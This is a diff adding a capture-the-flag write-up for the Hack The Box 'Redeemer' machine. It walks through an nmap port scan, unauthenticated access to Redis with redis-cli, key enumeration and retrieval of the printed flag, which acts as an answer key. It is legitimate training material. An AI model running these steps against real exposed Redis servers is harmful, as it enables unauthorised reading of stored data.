@@ -1,1 +1,141 @@
+# HTB Redeemer — Technical Write-up
 
+> **Platform:** Hack The Box  
+> **Machine:** Redeemer  
+> **Type:** CTF / Enumeration  
+
+## 1. Summary
+
+The successful path was:
+
+**Full port scan → Redis on port 6379 → Redis 5.0.7 → `redis-cli` → `KEYS *` → `GET flag`**
+
+No complex exploit was required. The key was identifying the exposed Redis service and enumerating its stored data directly.
+
+---
+
+## 2. Port Enumeration
+
+A full TCP port scan was performed against the target:
+
+```bash
+nmap -sVC 10.129.18.70 -Pn --min-rate=1500 -p-
+```
+ <img width="1855" height="983" alt="image" src="https://github.com/user-attachments/assets/e1d57d4a-d860-47fe-afca-0caa575d09c6" />
+
+The relevant result was:
+
+```text
+6379/tcp open  redis  Redis key-value store 5.0.7
+```
+
+<img width="1591" height="239" alt="image" src="https://github.com/user-attachments/assets/8ef55d80-4668-4b2f-be93-697fa7d4cb71" />
+
+
+This immediately established that Redis was exposed on TCP port `6379` and that the service version was `5.0.7`.
+
+---
+
+## 3. Connect to Redis
+
+The Redis command-line client was used to connect directly to the target:
+
+```bash
+redis-cli -h 10.129.18.70
+```
+
+The connection succeeded and provided the Redis prompt:
+
+```text
+10.129.18.70:6379>
+```
+
+No password prompt was encountered during the connection.
+
+---
+
+## 4. Enumerate Stored Keys
+
+Once connected, the Redis database was enumerated with:
+
+```redis
+KEYS *
+```
+
+The following keys were returned:
+
+```text
+1) "flag"
+2) "temp"
+3) "stor"
+4) "numb"
+```
+
+The `flag` key was immediately interesting and worth querying.
+
+---
+
+## 5. Retrieve the Flag
+
+The value of the `flag` key was retrieved with:
+
+```redis
+GET flag
+```
+
+Result:
+
+```text
+03e1d2b376c37ab3f5319922053953eb
+```
+
+<img width="2000" height="292" alt="image" src="https://github.com/user-attachments/assets/92f0461a-22e4-4fd2-84bd-c338f7099866" />
+
+
+### Flag
+
+```text
+03e1d2b376c37ab3f5319922053953eb
+```
+
+---
+
+## 6. Attack Chain
+
+```text
+Target
+  │
+  ├── Full port scan
+  │
+  └── 6379/tcp → Redis 5.0.7
+                    │
+                    ├── redis-cli
+                    │
+                    ├── KEYS *
+                    │      ├── flag
+                    │      ├── temp
+                    │      ├── stor
+                    │      └── numb
+                    │
+                    └── GET flag
+                           │
+                           └── 03e1d2b376c37ab3f5319922053953eb
+```
+
+## 7. Important Note
+
+The video does **not** visibly show execution of commands such as `DBSIZE`, `INFO`, or `SELECT`. They are therefore not presented here as commands that were executed during the session.
+
+## 8. Conclusion
+
+The machine was solved through straightforward service enumeration rather than exploitation of a Redis vulnerability.
+
+The key observations were:
+
+- A full port scan exposed TCP `6379`.
+- Nmap identified Redis `5.0.7`.
+- Direct access through `redis-cli` was possible.
+- Redis keys could be enumerated.
+- The `flag` key contained the target flag.
+
+**Main takeaway:** good service enumeration can eliminate the need for unnecessary exploitation.
